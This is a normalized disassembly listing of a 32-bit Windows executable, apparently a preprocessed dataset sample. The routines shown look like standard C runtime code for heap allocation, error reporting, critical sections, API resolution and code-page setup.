pop ebp
retn
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
call sub_406e7c
pop ecx
sub_4024f6
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_402531
int3
pop ebp
jmp eax
sub_402531
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_4023c4
push esi
call sub_40317a
add esp 0x10
pop esi
retn
push 0x5
pop ecx
int 0x29
sub_40255c
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
push esi
call sub_404f52
pop ecx
mov ecx [ esi + 0xc ]
mov edi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_4028d9
mov [ eax ] 0x9
push ebx
xor ebx ebx
test cl 0x1
je r-xdata
call sub_4028d9
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
mov [ esi + 0x4 ] ebx
or eax 0x2
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test cl 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
je r-xdata
call sub_4040b2
add eax 0x20
cmp esi eax
je r-xdata
or ecx 0x20
mov [ esi + 0xc ] ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
and ecx 0xfffffffe
mov [ esi ] eax
mov [ esi + 0xc ] ecx
xor eax eax
inc eax
push eax
mov [ ebp + 0xc ] eax
lea eax [ ebp + 0x8 ]
push eax
push edi
call sub_4055c4
add esp 0xc
mov ebx eax
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
sub ecx edx
mov [ ebp + 0xc ] ecx
lea eax [ edx + 0x1 ]
mov [ esi ] eax
mov eax [ esi + 0x18 ]
dec eax
mov [ esi + 0x4 ] eax
test ecx ecx
jle r-xdata
push edi
call sub_407040
pop ecx
test eax eax
jne r-xdata
call sub_4040b2
add eax 0x40
cmp esi eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx eax al
or [ esi + 0xc ] 0x20
cmp edi 0xffffffff
je r-xdata
push ecx
push edx
push edi
call sub_4055c4
add esp 0xc
mov ebx eax
jmp r-xdata
push esi
call sub_407203
pop ecx
pop ebx
mov ecx rw-data
cmp edi 0xfffffffe
je r-xdata
mov ecx [ esi + 0x8 ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
jmp r-xdata
push 0x2
push ebx
push ebx
push edi
call sub_407094
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax edi
mov ecx edi
sar eax 0x5
and ecx 0x1f
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
cmp ebx [ ebp + 0xc ]
je r-xdata
test [ ecx + 0x4 ] 0x20
je r-xdata
sub_4026ab
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
xor eax eax
push edi
lea edi [ ebp - 0x1c ]
push 0x7
pop ecx
[ edi ]
cmp [ ebp + 0x14 ] eax
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
test edi edi
je r-xdata
call sub_4028d9
mov [ eax ] 0x16
call sub_402521
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp edi 0x3fffffff
jbe r-xdata
test esi esi
jne r-xdata
pop edi
mov esp ebp
pop ebp
retn
lea eax [ edi + edi ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_4028d9
mov [ eax ] 0x16
call sub_402521
or eax 0xffffffff
jmp r-xdata
pop ebx
test ebx ebx
js r-xdata
push ebx
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov ebx eax
test esi esi
je r-xdata
pop esi
xor eax eax
cmp [ ebp - 0x1c ] eax
mov [ esi + edi * 2 - 0x2 ] ax
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_40255c
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_40255c
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov eax ebx
jmp r-xdata
sub_4027a6
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_4028d9
mov [ eax ] 0x16
call sub_402521
or eax 0xffffffff
pop ebp
retn
call sub_4028d9
mov [ eax ] 0x16
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_407249
call sub_4026ab
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
xor ecx ecx
mov [ esi ] cx
pop esi
pop ebp
retn
call sub_4028d9
mov [ eax ] 0x22
jmp r-xdata
call sub_402521
or eax 0xffffffff
sub_40281d
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] 0x0
test ecx ecx
jne r-xdata
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
push edi
call sub_40638a
mov edi eax
mov [ esi + 0x8 ] edi
mov edx [ edi + 0x6c ]
mov [ esi ] edx
mov ecx [ edi + 0x68 ]
mov [ esi + 0x4 ] ecx
cmp edx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
pop edi
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ecx + 0x70 ]
test al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ rw-data ]
test [ ecx + 0x70 ] eax
jne r-xdata
call sub_4081ef
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or eax 0x2
mov [ ecx + 0x70 ] eax
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_403a9f
mov [ esi + 0x4 ] eax
sub_4028b8
push ebp
mov ebp esp
push esi
call sub_4028a5
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_4028ec
pop ecx
mov esi eax
call sub_4028d9
mov [ eax ] esi
pop esi
pop ebp
retn
sub_4028ec
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + rw-data ]
pop ebp
retn
inc eax
cmp eax 0x2d
jb r-xdata
cmp ecx [ eax * 8 + rw-data ]
je r-xdata
lea eax [ ecx - 0x13 ]
cmp eax 0x11
ja r-xdata
lea eax [ ecx - 0xbc ]
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_40292d
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_402aec
pop ecx
call sub_4028d9
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
test esi esi
je r-xdata
call sub_4031a5
push 0x1e
call sub_403202
push 0xff
call sub_40198b
xor ecx ecx
inc ecx
mov ecx esi
jmp r-xdata
mov eax edi
pop edi
pop ebx
jmp r-xdata
push 0xc
pop ebx
cmp [ rw-data ] eax
je r-xdata
push ecx
push 0x0
push eax
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop esi
pop ebp
retn
call sub_4028d9
mov [ eax ] ebx
push esi
call sub_402aec
pop ecx
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
jmp r-xdata
call sub_4028d9
mov [ eax ] ebx
sub_4029bf
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_402a85
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4029ff
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_402a2d
mov eax esi
pop esi
pop ebp
retn 0x4
sub_402a2d
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
call sub_402ac3
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
push [ edi + 0x4 ]
mov ecx esi
call sub_402a85
jmp r-xdata
sub_402a60
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_402ac3
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_402bcd
pop ecx
sub_402a85
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push ebx
mov ebx ecx
je r-xdata
pop ebx
pop ebp
retn 0x4
push edi
push [ ebp + 0x8 ]
call sub_408310
lea edi [ eax + 0x1 ]
push edi
call sub_40292d
mov [ ebx + 0x4 ] eax
pop ecx
pop ecx
test eax eax
je r-xdata
pop edi
push [ ebp + 0x8 ]
push edi
push eax
call sub_4086c5
add esp 0xc
mov [ ebx + 0x8 ] 0x1
sub_402aec
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_402b1f
push ebp
mov ebp esp
sub esp 0x20
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] esi
test esi esi
je r-xdata
test [ esi ] 0x10
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
test [ esi ] 0x8
je r-xdata
mov ecx [ edi ]
sub ecx 0x4
push ecx
mov eax [ ecx ]
mov esi [ eax + 0x18 ]
call [ eax + 0x20 ]
mov [ ebp - 0xc ] 0x1994000
sub_402b90
push ebp
mov ebp esp
lea eax [ ecx + 0x9 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0x9
push eax
call sub_408720
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_402bae
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_402b82
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_402bcd
pop ecx
sub_402bcd
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_4028d9
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_4028ec
pop ecx
mov [ esi ] eax
pop esi
sub_402c05
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_402c25
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_402c45
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi * 8 + rw-data ] 0x0
jne r-xdata
push [ esi * 8 + rw-data ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push esi
call sub_402ccd
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_4019a1
sub_402c79
push esi
push edi
mov esi rw-data
mov edi esi
push ebx
add edi 0x8
cmp edi rw-data
jl r-xdata
cmp [ edi + 0x4 ] 0x1
je r-xdata
mov ebx [ edi ]
test ebx ebx
je r-xdata
pop ebx
push ebx
call [ DeleteCriticalSection@IAT ]
push ebx
call sub_402bcd
and [ edi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
retn
push [ esi ]
call [ DeleteCriticalSection@IAT ]
sub_402ccd
push 0x8
push r--data
call sub_4021d0
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp [ edi * 8 + rw-data ] ebx
jne r-xdata
call sub_4031a5
push 0x1e
call sub_403202
push 0xff
call sub_40198b
xor eax eax
inc eax
push 0x18
call sub_402131
pop ecx
mov esi eax
test esi esi
jne r-xdata
push 0xa
call sub_402c45
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ edi * 8 + rw-data ] ebx
jne r-xdata
call sub_4028d9
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
push esi
call sub_402bcd
pop ecx
push ebx
push 0xfa0
push esi
call sub_402e65
add esp 0xc
mov [ edi * 8 + rw-data ] esi
jmp r-xdata
call sub_402215
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_402d6d
sub_402d76
push esi
push edi
mov esi rw-data
mov edi rw-data
add esi 0x8
cmp esi rw-data
jl r-xdata
push 0x0
mov [ esi ] edi
add edi 0x18
push 0xfa0
push [ esi ]
call sub_402e65
add esp 0xc
cmp [ esi + 0x4 ] 0x1
jne r-xdata
xor eax eax
pop edi
inc eax
pop esi
retn
sub_402e20
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsSetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_402e42
push ebp
mov ebp esp
sub esp 0x44
lea eax [ ebp - 0x44 ]
push eax
call [ GetStartupInfoW@IAT ]
test [ ebp - 0x18 ] 0x1
je r-xdata
push 0xa
pop eax
movzx eax [ ebp - 0x14 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_402e65
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
xor eax eax
inc eax
pop ebp
retn
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_402e93
push ebp
mov ebp esp
push ecx
push esi
mov esi [ rw-data ]
test esi esi
jns r-xdata
xor eax eax
test esi esi
pop esi
setg al
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
xor esi esi
xor eax [ rw-data ]
mov [ ebp - 0x4 ] esi
je r-xdata
mov [ rw-data ] esi
push esi
lea ecx [ ebp - 0x4 ]
push ecx
call eax
cmp eax 0x7a
jne r-xdata
inc esi
sub_402ed3
push esi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ GetProcAddress@IAT ]
mov edi eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
mov [ rw-data ] eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
mov [ rw-data ] eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
pop edi
mov [ rw-data ] eax
pop esi
retn
sub_4031a5
push 0x3
call sub_406cf6
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_403202
push 0xff
call sub_403202
pop ecx
pop ecx
push 0x3
call sub_406cf6
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_4031de
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x17
jb r-xdata
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_403202
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_4031de
mov edi eax
pop ecx
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40174b
mov esp ebp
pop ebp
retn
push ebx
push 0x3
call sub_406cf6
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x3
call sub_406cf6
pop ecx
test eax eax
jne r-xdata
pop ebx
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor ebx ebx
mov ecx ebx
push r--data
push 0x314
push rw-data
call sub_408889
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
mov [ ebp - 0x5 ] bl
push eax
lea eax [ ebp - 0x1f8 ]
push eax
call sub_408310
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc ecx
cmp ecx 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_402531
int3
push 0x104
push rw-data
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov esi 0x2fb
test eax eax
jne r-xdata
mov al [ edi + ecx * 2 ]
mov [ ebp + ecx - 0x1f8 ] al
cmp [ edi + ecx * 2 ] bx
je r-xdata
push rw-data
call sub_4088e5
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push esi
push rw-data
call sub_408889
add esp 0xc
test eax eax
jne r-xdata
push r--data
push 0x314
mov esi rw-data
push esi
call sub_40881d
add esp 0xc
test eax eax
jne r-xdata
push rw-data
call sub_4088e5
push 0x3
push r--data
lea ecx [ eax * 2 + rw-data ]
mov eax ecx
sub eax rw-data
sar eax 0x1
sub esi eax
push esi
push ecx
call sub_4088fe
add esp 0x14
test eax eax
jne r-xdata
push edi
push 0x314
push esi
call sub_40881d
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push esi
call sub_4089bc
add esp 0xc
jmp r-xdata
sub_4033c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
push ebx
push esi
push edi
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
movzx ebx [ ecx + 0x6 ]
add eax 0x18
add eax ecx
test ebx ebx
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx ebx
jb r-xdata
mov ecx [ eax + 0x8 ]
add ecx esi
cmp edi ecx
jb r-xdata
mov esi [ eax + 0xc ]
cmp edi esi
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_403410
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_402230
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_4034d0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_4033c0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4034d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x5a4d
cmp [ eax ] cx
je r-xdata
mov ecx [ eax + 0x3c ]
add ecx eax
xor eax eax
cmp [ ecx ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
pop ebp
retn
mov edx 0x10b
cmp [ ecx + 0x18 ] dx
sete al
sub_4035e6
push 0x24
push r--data
call sub_4021d0
and [ ebp - 0x2c ] 0x0
and [ ebp - 0x30 ] 0x0
xor ebx ebx
mov [ ebp - 0x20 ] ebx
xor edi edi
mov [ ebp - 0x28 ] edi
mov esi [ ebp + 0x8 ]
cmp esi 0xb
jg r-xdata
mov eax esi
sub eax 0xf
je r-xdata
je r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_4063a2
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax esi
push 0x2
pop ecx
sub eax ecx
je r-xdata
xor eax eax
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
push esi
call sub_4037a1
pop ecx
pop ecx
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax [ eax ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
test ebx ebx
je r-xdata
push 0x3
call sub_401a5f
xor ebx ebx
inc ebx
mov [ ebp - 0x20 ] ebx
push eax
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_4028d9
mov [ eax ] 0x16
call sub_402521
jmp r-xdata
mov [ ebp - 0x24 ] eax
cmp eax 0x1
je r-xdata
call sub_402215
retn
sub eax ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi 0x8
je r-xdata
push 0x0
call sub_402c45
pop ecx
sub eax ecx
jne r-xdata
mov eax [ edi + 0x60 ]
mov [ ebp - 0x2c ] eax
and [ edi + 0x60 ] 0x0
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] eax
mov eax [ edi + 0x64 ]
mov [ ebp - 0x30 ] eax
mov [ edi + 0x64 ] 0x8c
cmp esi 0x4
jne r-xdata
push esi
call [ ebp - 0x24 ]
push [ edi + 0x64 ]
push esi
call [ ebp - 0x24 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov edx ecx
mov [ ebp - 0x34 ] edx
cmp esi 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
pop ecx
cmp esi 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_403767
cmp esi 0x8
jne r-xdata
imul ecx edx 0xc
mov eax [ edi + 0x5c ]
and [ eax + ecx + 0x8 ] 0x0
inc edx
mov [ ebp - 0x34 ] edx
mov ecx [ r--data ]
jmp r-xdata
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp esi 0x4
jne r-xdata
mov eax [ r--data ]
add eax ecx
cmp edx eax
jge r-xdata
sub_4037a1
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov ecx [ r--data ]
push esi
mov esi [ ebp + 0x8 ]
imul ecx ecx 0xc
add ecx [ ebp + 0xc ]
cmp edx ecx
jae r-xdata
imul eax ecx 0xc
add edx 0xc
add eax [ ebp + 0xc ]
cmp edx eax
jb r-xdata
xor eax eax
cmp [ edx + 0x4 ] esi
jne r-xdata
cmp [ edx + 0x4 ] esi
je r-xdata
mov eax edx
jmp r-xdata
pop esi
pop ebp
retn
sub_403806
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub eax 0x3a4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0x4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0xd
je r-xdata
mov eax [ r--data ]
pop ebp
retn
dec eax
je r-xdata
mov eax [ r--data ]
pop ebp
retn
xor eax eax
pop ebp
retn
sub_403840
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push 0x0
call sub_40281d
and [ rw-data ] 0x0
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
jmp r-xdata
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] 0x1
mov eax [ eax + 0x4 ]
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4038ae
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x101
xor edi edi
lea esi [ ebx + 0x18 ]
push edi
push esi
call sub_406fb0
mov [ ebx + 0x4 ] edi
xor eax eax
mov [ ebx + 0x8 ] edi
add esp 0xc
mov [ ebx + 0x21c ] edi
mov ecx 0x101
lea edi [ ebx + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov edi rw-data
sub edi ebx
mov al [ edi + esi ]
mov [ esi ] al
inc esi
dec ecx
jne r-xdata
lea ecx [ ebx + 0x119 ]
mov edx 0x100
mov al [ ecx + edi ]
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40390d
push ebp
mov ebp esp
sub esp 0x520
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x518 ]
push edi
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
xor ebx ebx
mov edi 0x100
test eax eax
je r-xdata
push 0xffffff9f
lea edx [ esi + 0x119 ]
mov ecx ebx
pop eax
sub eax edx
mov [ ebp - 0x520 ] eax
mov eax ebx
